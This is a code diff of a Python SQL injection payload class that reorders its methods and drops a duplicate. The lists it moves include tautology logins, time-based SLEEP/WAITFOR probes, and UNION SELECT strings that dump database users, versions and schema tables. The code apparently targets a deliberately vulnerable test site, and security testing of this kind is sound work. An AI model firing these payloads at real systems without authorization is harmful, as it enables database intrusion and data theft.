@@ -7,45 +7,6 @@ class SQLiPayloads:
     
     @staticmethod
     def get_basic_payloads():
-        """Get basic SQL injection payloads"""
-        return [
-            "'",
-            "' OR '1'='1",
-            "' OR '1'='1' --",
-            "' OR '1'='1' /*",
-            "1' OR '1'='1",
-            "admin'--",
-            "' UNION SELECT NULL--",
-            "' AND 1=1--",
-            "' AND 1=2--",
-            "1 OR 1=1"
-        ]
-    
-    @staticmethod
-    def get_time_based_payloads():
-        """Get time-based SQL injection payloads"""
-        return [
-            "' AND SLEEP(5)--",
-            "'; WAITFOR DELAY '00:00:05'--",
-            "' OR pg_sleep(5)--",
-            "1; SELECT SLEEP(5)",
-            "' UNION SELECT SLEEP(5)--"
-        ]
-    
-    @staticmethod
-    def get_union_payloads():
-        """Get UNION-based SQL injection payloads"""
-        return [
-            "' UNION SELECT NULL--",
-            "' UNION SELECT NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL--",
-            "' UNION SELECT 1,2,3--",
-            "' UNION SELECT user(),database(),version()--",
-            "' UNION SELECT table_name FROM information_schema.tables--"
-        ]
-    
-    @staticmethod
-    def get_basic_payloads():
         """Get basic SQL injection payloads optimized for testphp.vulnweb.com"""
         return [
             # Basic error-based
@@ -113,6 +74,29 @@ class SQLiPayloads:
             # Double query
             "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
             "' AND (SELECT COUNT(*) FROM mysql.user)>0--"
+        ]
+    
+    @staticmethod
+    def get_time_based_payloads():
+        """Get time-based SQL injection payloads"""
+        return [
+            "' AND SLEEP(5)--",
+            "'; WAITFOR DELAY '00:00:05'--",
+            "' OR pg_sleep(5)--",
+            "1; SELECT SLEEP(5)",
+            "' UNION SELECT SLEEP(5)--"
+        ]
+    
+    @staticmethod
+    def get_union_payloads():
+        """Get UNION-based SQL injection payloads"""
+        return [
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL--",
+            "' UNION SELECT 1,2,3--",
+            "' UNION SELECT user(),database(),version()--",
+            "' UNION SELECT table_name FROM information_schema.tables--"
         ]
     
     @staticmethod
